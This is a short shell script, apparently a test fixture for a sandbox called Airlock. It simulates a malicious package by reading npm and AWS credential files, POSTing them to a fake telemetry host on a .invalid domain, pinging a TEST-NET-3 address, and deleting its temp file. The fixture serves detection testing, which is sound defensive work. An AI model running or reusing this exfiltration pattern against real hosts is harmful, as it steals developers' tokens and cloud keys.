#!/bin/sh
# Airlock test fixture: a credential stealer written without any Node code, so only
# the in-guest watcher (not the Node tracer) can see it. Targets are unroutable:
# a .invalid hostname and a TEST-NET-3 address. Only ever run inside Airlock.
for f in "$HOME/.npmrc" "$HOME/.aws/credentials"; do
  [ -f "$f" ] && cat "$f" >> /tmp/.cache-colorful 2>/dev/null
done
curl -s -m 4 -X POST --data-binary @/tmp/.cache-colorful https://telemetry.colorful-logs.invalid/v1 >/dev/null 2>&1
curl -s -m 2 http://203.0.113.7:8080/ping >/dev/null 2>&1
python3 -c "open('$HOME/.aws/credentials').read()" 2>/dev/null
rm -f /tmp/.cache-colorful
exit 0
